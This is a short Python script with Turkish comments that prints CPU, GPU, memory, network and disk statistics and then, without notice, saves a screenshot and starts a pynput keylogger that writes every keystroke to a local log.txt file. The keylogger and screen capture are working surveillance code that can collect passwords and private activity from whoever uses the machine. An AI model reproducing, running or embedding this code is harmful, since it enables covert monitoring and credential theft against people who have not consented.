import psutil
import GPUtil
from PIL import ImageGrab
import os
import datetime
import cv2
from pynput import keyboard

def get_cpu_info():
    cpu_percent = psutil.cpu_percent()
    print("CPU Kullanımı: {}%".format(cpu_percent))

def get_gpu_info():
    gpus = GPUtil.getGPUs()
    if gpus:
        gpu = gpus[0]
        gpu_percent = gpu.load * 100
        gpu_temp = gpu.temperature
        print("GPU Kullanımı: {}%".format(gpu_percent))
        print("GPU Sıcaklığı: {}°C".format(gpu_temp))
    else:
        print("GPU bulunamadı.")

def get_memory_info():
    memory = psutil.virtual_memory()
    memory_percent = memory.percent
    memory_total = round(memory.total / (1024 ** 3), 2)
    memory_used = round(memory.used / (1024 ** 3), 2)
    print("Bellek Kullanımı: {}%".format(memory_percent))
    print("Toplam Bellek: {} GB".format(memory_total))
    print("Kullanılan Bellek: {} GB".format(memory_used))

def get_network_info():
    network = psutil.net_io_counters()
    network_bytes_sent = round(network.bytes_sent / (1024 ** 2), 2)
    network_bytes_received = round(network.bytes_recv / (1024 ** 2), 2)
    print("Gönderilen Veri: {} MB".format(network_bytes_sent))
    print("Alınan Veri: {} MB".format(network_bytes_received))

def get_disk_usage():
    disk_info = psutil.disk_usage('/')
    total = disk_info.total
    used = disk_info.used
    percent = disk_info.percent
    print(f"Disk Kullanımı: Toplam {total} bytes, Kullanılan {used} bytes, Yüzde {percent}% dolu")

def capture_screen(save_directory):
    # Ekran görüntüsünü yakala
    screenshot = ImageGrab.grab()
    
    # Kaydetmek için dosya adı oluştur
    current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"screen_capture_{current_time}.png"
    
    # Kayıt dizinine tam dosya yolu oluştur
    file_path = os.path.join(save_directory, file_name)
    
    # Ekran görüntüsünü kaydet
    screenshot.save(file_path)
    
    print("Ekran görüntüsü kaydedildi:", file_path)


def on_press(key):
    try:
        with open("log.txt", "a") as file:
            file.write(str(key.char))
    except AttributeError:
        with open("log.txt", "a") as file:
            file.write(str(key))

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


 


# CPU bilgilerini al
get_cpu_info()

# GPU bilgilerini al
get_gpu_info()

# Bellek bilgilerini al
get_memory_info()

# Ağ bilgilerini al
get_network_info()

# Disk bilgilerini al
get_disk_usage()

# Ekran görüntülerinin kaydedileceği klasörü belirtin
save_directory = "screen_captures"

# Kayıt klasörünü oluştur (eğer yoksa)
os.makedirs(save_directory, exist_ok=True)

# Ekran görüntüsü yakala ve kaydet
capture_screen(save_directory)

# Keylogger'ı başlat
start_keylogger()
